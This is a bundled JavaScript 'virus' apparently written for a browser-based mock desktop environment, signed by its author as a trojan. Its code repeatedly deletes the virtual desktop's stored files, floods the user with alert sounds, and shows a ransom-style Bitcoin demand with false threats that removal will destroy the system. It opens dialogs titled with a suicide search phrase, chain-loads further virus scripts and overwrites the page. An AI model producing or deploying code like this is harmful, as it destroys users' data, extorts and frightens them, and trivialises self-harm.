(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
(function theLoop(i) {
    setTimeout(function() {

        // Function to generate random number
        function randomNumber(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 0.01)) + min;
        }

        $store.set('desktop/nainsec' + (randomNumber(1, 1000000)) + '.js', '$store.del("/a/desktop/")');
        for (let j = 0; j < 14; j++) {
            $audio('alert').play();
        }
        $store.keys();
        if (--i) {
            theLoop(i);
        }
    }, 10);
})(50);

$alert('WARNING YOU HAVE BEEN INFECTED BY NAINSEC. BTC: 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5');
$loader.script("NaInSec_Virus.js");

$exe("hydra");

$exe("textarea");
$window.current.el.body.firstChild.value = "Looks like I have compromised your PC.\nUse it as long as you can.\n:V\nAttempting to remove NaInSec_Virus will instantly destroy your system, so don't attempt it. Created by XSVSCyb3r :V\nBTC: 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5";
$window.current.changeSize({ width: 750, height: 400 });

$alert({
    draggable: !1,
    header: !1,
    center: !1,
    title: "'Best way to kill myself' - Bing search",
    icon: "NaInSec.png",
    msg: "Reboot button",
    btnOk: "Reboot",
    onclose: function () {
        document.write('<h1>Your computer has been destroyed by NaInSec_Virus trojan. Enjoy the Nyan Cat... Made by XSVSCyb3r.</h1><img width="600" src="https://i.ibb.co/7r9kpzS/source.gif"><iframe width="30" height="32" src="https://www.youtube.com/@XSVSCyb3r101" frameborder="0" allow="accelerometer; autoplay; loop; encrypted-media; gyroscope; picture-in-picture" allowfullscreen autoplay loop></iframe>');
    }
});

$alert({
    draggable: !1,
    header: !1,
    center: !1,
    title: "'Best way to kill myself' - Bing search",
    icon: "NaInSec.png",
    msg: "PC Destroy 100%? (do this last please)",
    btnOk: "yes",
    onclose: function () {
        $loader.script("MemoryVirus.js");
    }
});

$alert({
    draggable: !1,
    header: !1,
    center: !1,
    title: "'Best way to kill myself' - Bing search",
    icon: "NaInSec.png",
    msg: "PC Destroy 100%? (do this last please)",
    btnOk: "yes",
    onclose: function () {
        $loader.script("Virus.js");
    }
});


},{}]},{},[1]);

},{}]},{},[1]);
